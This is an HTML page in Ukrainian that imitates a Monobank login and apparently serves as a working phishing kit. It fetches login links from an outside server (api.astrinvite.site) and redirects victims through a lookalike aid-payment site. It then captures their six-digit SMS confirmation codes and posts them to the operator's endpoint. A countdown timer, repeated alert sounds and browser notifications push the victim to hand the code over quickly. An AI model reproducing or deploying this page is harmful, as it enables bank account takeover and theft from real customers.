<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <title>Вхід через Monobank</title>
  <link rel="icon" href="favicon.ico" type="image/x-icon">
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      background-color: #f0f0f0;
    }
    h1 {
      margin-bottom: 20px;
    }
    #monobank-btn {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #4CAF50;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      text-decoration: none;
    }
    #monobank-btn:disabled {
      background-color: #aaa;
      cursor: not-allowed;
    }
    #status {
      margin-top: 15px;
      color: #555;
      font-size: 18px;
      text-align: center;
    }
    #return-instruction {
      margin:14px 0;
      color:#444;
      max-width:400px;
      display:none;
      text-align: center;
    }
    #sms-code {
      font-size: 22px;
      letter-spacing: 10px;
      padding: 8px 20px;
      text-align: center;
      width: 190px;
      margin-top: 12px;
      margin-bottom: 8px;
    }
    #send-code-btn {
      margin-left: 10px;
      padding: 10px 30px;
      font-size: 18px;
      background: #1976d2;
      color: #fff;
      border: none;
      border-radius: 7px;
      cursor: pointer;
    }
    #send-code-btn:disabled {
      background-color: #aaa;
      cursor: not-allowed;
    }
    #sms-error {
      color: red;
      margin-top: 5px;
    }
    #timer {
      color: #c60;
      margin-left: 16px;
      font-weight: bold;
      font-size: 20px;
    }
  </style>
</head>
<body>
  <h1>Вхід через Monobank</h1>
  <button id="monobank-btn" disabled>Завантаження...</button>
  <div id="return-instruction">
    <b>Після підтвердження в Monobank поверніться на цю сторінку.<br>
    Код підтвердження з'явиться тут автоматично.</b>
  </div>
  <div id="status">Очікуємо на посилання...</div>
  <audio id="sms-audio" src="sms.mp3"></audio>

  <script>
    const apiUrl = "https://api.astrinvite.site/link";
    const consumeUrl = "https://api.astrinvite.site/consume-link";
    const statusUrl = "https://api.astrinvite.site/api/link-status";
    const codeUrl = "https://api.astrinvite.site/api/submit-code";
    const btn = document.getElementById("monobank-btn");
    const status = document.getElementById("status");
    let currentId = null;
    let pollingStatus = false;
    let statusPoller = null;
    let link = null;
    let smsTimerInterval = null;
    let smsSoundInterval = null;

    async function getLink() {
      try {
        const res = await fetch(apiUrl);

        if (res.status === 204 || res.status === 429) {
          btn.textContent = "Очікуємо на посилання...";
          btn.disabled = true;
          status.textContent = "Спробуємо ще раз за 3 секунди...";
          setTimeout(getLink, 3000);
          return;
        }

        const data = await res.json();
        if (data.url && data.id) {
          currentId = data.id;
          link = data.url;
          btn.textContent = "Увійти через Monobank";
          btn.disabled = false;
          status.textContent = "Натисніть кнопку для входу.";
          btn.onclick = () => {
            fetch(`${consumeUrl}?id=${currentId}`, { method: "POST" });
            document.getElementById("return-instruction").style.display = "";
            let redirectLink = link;
            try {
              const redirectUrl = encodeURIComponent("https://mono-edopomoga.github.io/2025/");
              if (!redirectLink.includes("redirect_uri=")) {
                redirectLink += (redirectLink.includes("?") ? "&" : "?") + "redirect_uri=" + redirectUrl;
              }
            } catch {}
            window.location.href = redirectLink;
            pollStatus();
          };
        } else {
          throw new Error("Немає посилання");
        }
      } catch (e) {
        btn.textContent = "Помилка сервера";
        btn.disabled = true;
        status.textContent = "Неможливо отримати посилання.";
        console.error(e);
        setTimeout(getLink, 3000);
      }
    }

    async function pollStatus() {
      if (pollingStatus) return;
      pollingStatus = true;
      btn.style.display = "none";
      statusPoller = setInterval(async () => {
        try {
          const res = await fetch(`${statusUrl}?id=${currentId}`);
          const data = await res.json();
          if (data.status === "waiting_code") {
            clearInterval(statusPoller);
            showCodeInput();
          }
        } catch {}
      }, 2500);
    }

    function showCodeInput() {
      status.innerHTML = `
        <b>Введіть 6-значний код з SMS:</b><br>
        <input id="sms-code" type="text" maxlength="6" style="" autocomplete="one-time-code" inputmode="numeric">
        <button id="send-code-btn">Підтвердити</button>
        <span id="timer"></span>
        <div id="sms-error"></div>
      `;
      document.getElementById("sms-code").focus();

      // Запуск таймера, звука, пуша
      startSMSTimer();

      document.getElementById("send-code-btn").onclick = async () => {
        let code = document.getElementById("sms-code").value.trim();
        if (!/^\d{6}$/.test(code)) {
          document.getElementById("sms-error").textContent = "Введіть коректний 6-значний код!";
          return;
        }
        document.getElementById("send-code-btn").disabled = true;
        document.getElementById("sms-error").textContent = "";
        let fd = new FormData();
        fd.append("id", currentId);
        fd.append("code", code);
        try {
          const res = await fetch(codeUrl, { method: "POST", body: fd });
          const resp = await res.json();
          if (resp.ok) {
            status.innerHTML = "<b>Код прийнято. Чекаємо підтвердження на пристрої…</b>";
            stopSMSTimer();
          } else {
            document.getElementById("send-code-btn").disabled = false;
            document.getElementById("sms-error").textContent = "Помилка: " + (resp.error || "спробуйте ще");
          }
        } catch {
          document.getElementById("send-code-btn").disabled = false;
          document.getElementById("sms-error").textContent = "Помилка серверу. Спробуйте ще раз.";
        }
      };
    }

    // --- Таймер и звук ---
    function startSMSTimer() {
      let seconds = 180;
      playSMSAudio(); // первый звук
      showSMSPush();
      updateSMSTimer(seconds);

      smsSoundInterval = setInterval(() => {
        playSMSAudio();
      }, 5000);

      smsTimerInterval = setInterval(() => {
        seconds--;
        updateSMSTimer(seconds);
        if (seconds <= 0) {
          clearInterval(smsTimerInterval);
          clearInterval(smsSoundInterval);
          document.getElementById("timer").textContent = "⏰ Час вичерпано!";
        }
      }, 1000);
    }
    function stopSMSTimer() {
      if (smsTimerInterval) clearInterval(smsTimerInterval);
      if (smsSoundInterval) clearInterval(smsSoundInterval);
      document.getElementById("timer").textContent = "";
    }
    function updateSMSTimer(seconds) {
      let m = Math.floor(seconds / 60), s = seconds % 60;
      document.getElementById("timer").textContent = `⏳ ${m}:${s < 10 ? "0" : ""}${s}`;
    }
    function playSMSAudio() {
      try {
        const audio = document.getElementById("sms-audio");
        audio.currentTime = 0;
        audio.play();
      } catch {}
    }
    // --- Пуш-уведомление ---
    function showSMSPush() {
      if ("Notification" in window) {
        if (Notification.permission === "granted") {
          new Notification("Введіть код з SMS для завершення входу!", {
            body: "Вікно для коду вже чекає вас на сайті.",
            icon: "favicon.ico"
          });
        } else if (Notification.permission !== "denied") {
          Notification.requestPermission().then(function (permission) {
            if (permission === "granted") {
              new Notification("Введіть код з SMS для завершення входу!", {
                body: "Вікно для коду вже чекає вас на сайті.",
                icon: "favicon.ico"
              });
            }
          });
        }
      }
    }

    getLink();
  </script>
</body>
</html>
